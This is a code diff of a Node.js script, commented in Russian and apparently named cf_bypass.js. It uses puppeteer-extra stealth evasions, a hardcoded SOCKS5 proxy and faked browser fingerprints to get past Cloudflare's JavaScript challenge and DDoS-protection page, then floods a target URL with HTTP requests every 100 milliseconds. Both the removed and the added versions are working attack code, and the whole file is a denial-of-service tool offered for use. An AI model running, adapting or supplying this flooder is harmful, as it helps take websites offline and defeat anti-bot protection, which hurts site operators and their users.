@@ -2,142 +2,126 @@ const puppeteer = require('puppeteer-extra');
 const StealthPlugin = require('puppeteer-extra-plugin-stealth');
 const axios = require('axios');
 const fs = require('fs');
-const { Worker } = require('worker_threads');
+const { SocksProxyAgent } = require('socks-proxy-agent');
 
-// Глубокие настройки stealth
-puppeteer.use(StealthPlugin());
-puppeteer.use(require('puppeteer-extra-plugin-anonymize-ua')());
+// Глубокая настройка stealth
+const stealth = StealthPlugin();
+stealth.enabledEvasions.delete('user-agent-override');
+puppeteer.use(stealth);
 
-const CHROME_ARGS = [
-    '--no-sandbox',
-    '--disable-setuid-sandbox',
-    '--disable-dev-shm-usage',
-    '--disable-accelerated-2d-canvas',
-    '--disable-gpu',
-    '--lang=en-US,en',
-    '--window-size=1920,1080'
-];
+// Конфигурация
+const PROXY = 'socks5://64.69.43.232:1080'; // SOCKS5 лучше для Cloudflare
+const USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
+const TIMEOUT = 90000; // 90 секунд
 
-async function attackTarget(targetUrl, proxy, rate) {
-    console.log(`[⚙] Инициализация атаки на ${targetUrl}`);
+async function launchBrowser() {
+    const agent = new SocksProxyAgent(PROXY);
     
-    const browser = await puppeteer.launch({
+    return await puppeteer.launch({
         headless: 'new',
-        args: [...CHROME_ARGS, `--proxy-server=${proxy}`],
+        args: [
+            '--no-sandbox',
+            '--disable-setuid-sandbox',
+            '--disable-dev-shm-usage',
+            '--disable-accelerated-2d-canvas',
+            `--proxy-server=${PROXY.split('://')[1]}`,
+            '--lang=en-US,en'
+        ],
         ignoreHTTPSErrors: true,
         executablePath: '/usr/bin/google-chrome'
     });
+}
 
+async function bypassProtection(page, targetUrl) {
     try {
+        console.log('🔄 Обход защиты...');
+        
+        // Улучшенная эмуляция человеческого поведения
+        await page.mouse.move(100, 100);
+        await page.waitForTimeout(2000);
+        await page.mouse.click(100, 100, { delay: 150 });
+        
+        // Решение JS-челленджей
+        await page.evaluate(() => {
+            if (typeof window.___cf_chl_opt === 'object') {
+                window.___cf_chl_opt.onLoad();
+            }
+        });
+        
+        await page.waitForNavigation({ waitUntil: 'networkidle0', timeout: TIMEOUT });
+        return true;
+    } catch (error) {
+        console.error('⚠️ Ошибка обхода:', error.message);
+        return false;
+    }
+}
+
+async function attack() {
+    const targetUrl = 'https://uam.dstat123.uk/91d3e5fd-1b84-46ae-8273-5447dd8fe535';
+    let browser;
+    
+    try {
+        console.log('🚀 Запуск браузера...');
+        browser = await launchBrowser();
         const page = await browser.newPage();
         
-        // Детальная настройка фингерпринта
+        // Настройка сессии
+        await page.setUserAgent(USER_AGENT);
         await page.setExtraHTTPHeaders({
             'Accept-Language': 'en-US,en;q=0.9',
-            'Sec-Ch-Ua': '"Chromium";v="118", "Google Chrome";v="118"'
+            'Sec-Ch-Ua': '"Chromium";v="120", "Google Chrome";v="120"'
         });
 
-        // Эмуляция человеческого поведения
-        await page.setViewport({ width: 1920, height: 1080, deviceScaleFactor: 1 });
-        await page.evaluateOnNewDocument(() => {
-            delete navigator.__proto__.webdriver;
-            Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3] });
-        });
-
-        console.log(`[🌐] Переход на целевой URL...`);
+        console.log(`🌐 Переход на ${targetUrl}`);
         await page.goto(targetUrl, {
             waitUntil: 'domcontentloaded',
-            timeout: 60000
+            timeout: TIMEOUT
         });
 
-        // Расширенная обработка Cloudflare
-        await handleCloudflare(page);
-        
-        console.log(`[✅] Успешное подключение. Запуск флуда...`);
-        startRequestsFlood(targetUrl, proxy, rate);
-
-    } catch (error) {
-        console.error(`[💥] Критическая ошибка: ${error.message}`);
-        await browser.close();
-    }
-}
-
-async function handleCloudflare(page) {
-    try {
+        // Проверка защиты
         const title = await page.title();
-        if (!title.includes('Just a moment')) return;
+        if (title.includes('Just a moment') || title.includes('DDoS protection')) {
+            if (!await bypassProtection(page, targetUrl)) {
+                throw new Error('Не удалось обойти защиту');
+            }
+        }
 
-        console.log('[🛡] Обнаружена защита Cloudflare');
-        
-        // Расширенная эмуляция человеческого поведения
-        await page.mouse.move(100, 100);
-        await page.waitForTimeout(1500);
-        await page.mouse.move(200, 200);
-        await page.waitForTimeout(1000);
-        
-        // Решение JavaScript Challenge
-        await page.waitForFunction(() => {
-            const el = document.querySelector('#challenge-form');
-            return el && el.offsetParent !== null;
-        }, { timeout: 15000 });
-        
-        await page.click('#challenge-form input[type="submit"]');
-        await page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 20000 });
-        
-        console.log('[✅] Защита успешно пройдена');
+        console.log('✅ Успешное подключение. Начинаем флуд...');
+        startFlood(targetUrl);
+
     } catch (error) {
-        console.error('[❌] Не удалось обойти защиту:', error.message);
-        throw error;
+        console.error(`💥 Критическая ошибка: ${error.message}`);
+    } finally {
+        if (browser) await browser.close();
     }
 }
 
-function startRequestsFlood(targetUrl, proxy, rate) {
-    const [proxyHost, proxyPort] = proxy.split(':');
-    let requestCount = 0;
-
-    console.log(`[🔥] Запуск флуда с интенсивностью ${rate} запр/сек`);
+function startFlood(targetUrl) {
+    const agent = new SocksProxyAgent(PROXY);
+    let successCount = 0;
     
-    const interval = setInterval(async () => {
+    const flood = setInterval(async () => {
         try {
             await axios.get(targetUrl, {
-                proxy: {
-                    host: proxyHost,
-                    port: parseInt(proxyPort)
-                },
+                httpsAgent: agent,
                 timeout: 5000,
                 headers: {
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                    'User-Agent': USER_AGENT,
                     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
                 }
             });
+            successCount++;
             process.stdout.write('.');
-            requestCount++;
-        } catch (error) {
+        } catch (e) {
             process.stdout.write('x');
         }
-    }, 1000 / rate);
+    }, 100);
 
-    // Статистика каждые 10 секунд
+    // Статистика
     setInterval(() => {
-        console.log(`\n[📊] Отправлено запросов: ${requestCount}`);
+        console.log(`\n📊 Успешных запросов: ${successCount}`);
     }, 10000);
-
-    // Автоматическое завершение через 10 минут
-    setTimeout(() => {
-        clearInterval(interval);
-        console.log('\n[⏱] Атака завершена по таймауту');
-        process.exit(0);
-    }, 600000);
 }
 
 // Запуск
-if (process.argv.length < 5) {
-    console.log('Использование: node cf_bypass.js <URL> <proxy:port> <rate>');
-    process.exit(1);
-}
-
-attackTarget(
-    process.argv[2], 
-    process.argv[3], 
-    parseInt(process.argv[4])
-).catch(console.error);
+attack().catch(console.error);
